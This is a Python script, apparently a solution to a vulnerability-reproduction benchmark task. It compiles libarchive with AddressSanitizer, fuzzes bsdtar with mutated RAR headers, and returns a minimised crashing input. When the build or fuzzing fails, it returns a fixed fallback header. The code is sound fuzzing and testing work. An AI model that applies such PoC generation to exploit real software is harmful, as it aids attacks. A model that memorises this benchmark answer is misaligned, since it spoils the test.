import os
import sys
import subprocess
import tempfile
import shutil
import random
import tarfile
import time
import struct
from concurrent.futures import ThreadPoolExecutor

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Args:
            src_path: Path to the vulnerable source code tarball
        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        base_dir = tempfile.mkdtemp()
        try:
            # 1. Setup Build Environment
            src_extract_dir = os.path.join(base_dir, "source")
            os.makedirs(src_extract_dir)
            
            # Extract tarball
            if os.path.isfile(src_path) and (src_path.endswith('.tar.gz') or src_path.endswith('.tgz') or src_path.endswith('.tar')):
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=src_extract_dir)
            elif os.path.isdir(src_path):
                # Copy directory content
                shutil.rmtree(src_extract_dir)
                shutil.copytree(src_path, src_extract_dir)
            
            # Find the root with configure or CMakeLists.txt
            build_root = src_extract_dir
            for root, dirs, files in os.walk(src_extract_dir):
                if 'configure' in files or 'CMakeLists.txt' in files:
                    build_root = root
                    break
            
            # 2. Build libarchive with ASAN
            bsdtar_path = self._build(build_root)
            if not bsdtar_path:
                # Build failed, return a generic RAR header as fallback
                return b"\x52\x61\x72\x21\x1a\x07\x00" + b"\x00" * 39

            # 3. Fuzz to find crash
            poc = self._fuzz(bsdtar_path)
            
            if poc:
                # 4. Minimize
                poc = self._minimize(bsdtar_path, poc)
                return poc
            
            # If fuzzing fails, return default seed
            return b"\x52\x61\x72\x21\x1a\x07\x00" + b"\x00" * 39

        except Exception:
            return b"\x52\x61\x72\x21\x1a\x07\x00" + b"\x00" * 39
        finally:
            shutil.rmtree(base_dir, ignore_errors=True)

    def _build(self, cwd):
        env = os.environ.copy()
        env['CC'] = 'gcc'
        env['CXX'] = 'g++'
        # Basic ASAN flags
        flags = '-fsanitize=address -g -O1 -w'
        env['CFLAGS'] = flags
        env['CXXFLAGS'] = flags
        env['LDFLAGS'] = '-fsanitize=address'
        
        # Configure for minimal build (faster, fewer deps)
        if os.path.exists(os.path.join(cwd, 'configure')):
            # ensure configure is executable
            try:
                os.chmod(os.path.join(cwd, 'configure'), 0o755)
            except:
                pass
                
            cmd = [
                './configure',
                '--disable-shared',
                '--enable-static',
                '--without-zlib',
                '--without-bz2lib',
                '--without-lzma',
                '--without-lzo2',
                '--without-cng',
                '--without-openssl',
                '--without-xml2',
                '--without-expat',
                '--disable-acl',
                '--disable-xattr'
            ]
            subprocess.run(cmd, cwd=cwd, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['make', '-j8'], cwd=cwd, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif os.path.exists(os.path.join(cwd, 'CMakeLists.txt')):
            build_dir = os.path.join(cwd, 'build_poc')
            os.makedirs(build_dir, exist_ok=True)
            subprocess.run(['cmake', '..', '-DENABLE_ASAN=ON'], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['make', '-j8'], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Find bsdtar
        for root, dirs, files in os.walk(cwd):
            if 'bsdtar' in files:
                fpath = os.path.join(root, 'bsdtar')
                if os.access(fpath, os.X_OK):
                    return fpath
        return None

    def _fuzz(self, binary):
        # RAR Signature (Version 1.5-4.0)
        rar_sig = b"\x52\x61\x72\x21\x1a\x07\x00"
        
        def check(data):
            tf = tempfile.NamedTemporaryFile(delete=False)
            tf.write(data)
            tf.close()
            try:
                # -t: test archive integrity (triggers parsing)
                res = subprocess.run([binary, '-t', '-f', tf.name], 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.PIPE, 
                                     timeout=0.5)
                # Check for crash (non-zero exit) and ASAN report
                if res.returncode != 0 and b"AddressSanitizer" in res.stderr:
                    return data
            except:
                pass
            finally:
                if os.path.exists(tf.name):
                    os.unlink(tf.name)
            return None

        # Seeds
        seeds = []
        # Target length 46: Sig(7) + 39 bytes
        
        # Seed 1: Zeros after sig
        seeds.append(rar_sig + b'\x00' * 39)
        
        # Seed 2: Random bytes after sig
        for _ in range(10):
            seeds.append(rar_sig + os.urandom(39))
            
        # Seed 3: Crafted Block Headers
        # RAR Block Header: CRC(2) Type(1) Flags(2) Size(2) -> 7 bytes
        for _ in range(30):
            header = bytearray(7)
            struct.pack_into('<H', header, 0, random.randint(0, 0xFFFF)) # CRC
            header[2] = 0x74 # Type: File Header
            struct.pack_into('<H', header, 3, random.choice([0, 0x8000])) # Flags
            struct.pack_into('<H', header, 5, random.randint(0, 100)) # Size
            
            # Construct payload
            seeds.append(rar_sig + header + os.urandom(32))

        executor = ThreadPoolExecutor(max_workers=8)
        futures = {}
        
        # Fuzzing budget (seconds)
        start_time = time.time()
        timeout = 180 
        
        for s in seeds:
            futures[executor.submit(check, s)] = s
            
        while time.time() - start_time < timeout:
            done_list = []
            for f in futures:
                if f.done():
                    res = f.result()
                    if res:
                        executor.shutdown(wait=False)
                        return res
                    done_list.append(f)
            
            for f in done_list:
                parent = futures[f]
                del futures[f]
                
                # Generate new mutations
                if len(futures) < 16:
                    for _ in range(2):
                        mut = bytearray(parent)
                        if len(mut) > 7:
                            pos = random.randint(7, len(mut)-1)
                            op = random.randint(0, 3)
                            
                            if op == 0: # XOR
                                mut[pos] ^= random.randint(1, 255)
                            elif op == 1: # Set
                                mut[pos] = random.randint(0, 255)
                            elif op == 2 and len(mut) > 40: # Truncate (keep length small)
                                mut = mut[:-1]
                            elif op == 3 and len(mut) < 50: # Insert
                                mut.insert(pos, random.randint(0, 255))
                                
                        child = bytes(mut)
                        futures[executor.submit(check, child)] = child
            
            if not futures:
                break
            time.sleep(0.05)
            
        executor.shutdown(wait=False)
        return None

    def _minimize(self, binary, poc):
        # Minimization by truncating from the end
        best = poc
        while len(best) > 7:
            cand = best[:-1]
            tf = tempfile.NamedTemporaryFile(delete=False)
            tf.write(cand)
            tf.close()
            crash = False
            try:
                res = subprocess.run([binary, '-t', '-f', tf.name],
                                     stdout=subprocess.DEVNULL,
                                     stderr=subprocess.PIPE,
                                     timeout=0.5)
                if res.returncode != 0 and b"AddressSanitizer" in res.stderr:
                    crash = True
            except:
                pass
            finally:
                if os.path.exists(tf.name):
                    os.unlink(tf.name)
            
            if crash:
                best = cand
            else:
                break
        return best